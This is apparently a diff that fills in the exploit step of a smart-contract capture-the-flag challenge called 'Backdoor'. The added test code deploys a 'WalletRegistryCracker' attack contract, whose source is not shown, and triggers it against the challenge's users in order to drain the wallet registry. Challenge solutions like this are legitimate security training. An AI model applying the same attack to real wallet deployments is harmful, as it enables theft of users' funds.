@@ -1,5 +1,7 @@
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
+const { zeroPad } = require('ethers/lib/utils');
+
 
 describe('[Challenge] Backdoor', function () {
     let deployer, users, attacker;
@@ -37,6 +39,22 @@ describe('[Challenge] Backdoor', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        console.log(` `);
+        // Deployment
+        const params = [
+            this.token.address,
+            this.walletFactory.address,
+            this.masterCopy.address,
+            this.walletRegistry.address
+        ]
+
+        this.wrc = await (await ethers.getContractFactory("WalletRegistryCracker", attacker)).deploy(...params);
+        console.log(`Wallet Registry Cracker contract deployed at: ${this.wrc.address}`);
+        
+        await this.wrc.connect(attacker).rekt(users, {gasLimit: 2*10**7});
+        console.log(`Wallet Registry Rekt...`)
+
+
     });
 
     after(async function () {
